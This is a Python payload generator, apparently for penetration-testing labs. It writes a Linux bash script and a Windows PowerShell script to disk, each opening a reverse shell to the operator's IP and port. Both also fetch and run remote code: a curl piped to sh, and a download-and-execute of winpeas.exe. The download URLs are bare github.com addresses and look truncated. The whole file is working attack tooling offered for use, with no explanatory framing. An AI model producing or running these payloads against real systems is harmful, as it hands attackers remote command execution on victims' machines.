#!/usr/bin/env python3
import sys
import socket
import os

def get_attack_ip():
    try:
        import netifaces
        if 'tun0' in netifaces.interfaces():
            addrs = netifaces.ifaddresses('tun0')
            return addrs[netifaces.AF_INET]['addr']
    except ImportError:
        pass
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "127.0.0.1"

def generate_payloads(attack_ip, lport, target_name="strike"):
    print(f"[*] Utilizing Local Network Binding Address: {attack_ip}")
    print(f"[*] Utilizing Specified Listening Port: {lport}")
    
    linux_script_path = f"sectum_linux_{target_name}.sh"
    windows_script_path = f"sectum_win_{target_name}.ps1"
    
    linux_payload = (
        "#!/bin/bash\n"
        f"bash -i >& /dev/tcp/{attack_ip}/{lport} 0>&1 &\n"
        "curl -sL https://github.com | sh\n"
    )
    
    with open(linux_script_path, "w") as f:
        f.write(linux_payload)
    os.chmod(linux_script_path, 0o755)
    print(f"[+] Linux Deployment Script Ready: {linux_script_path}")
    
    windows_payload = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{attack_ip}',{lport});"
        "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n"
        "iwr https://github.com -OutFile winpeas.exe; .\\winpeas.exe\n"
    )
    
    with open(windows_script_path, "w") as f:
        f.write(windows_payload)
    print(f"[+] Windows PowerShell Automation Script Ready: {windows_script_path}")
    
    print("[+] Sectumsempra Payload Generation Complete")

def main():
    if len(sys.argv) < 3:
        print("[-] Usage error. Correct format: python3 sectumsempra.py <LPORT> <TARGET_NAME>")
        sys.exit(1)
        
    lport = sys.argv[1]
    target_name = sys.argv[2]
    attack_ip = get_attack_ip()
    generate_payloads(attack_ip, lport, target_name)

if __name__ == "__main__":
    main()
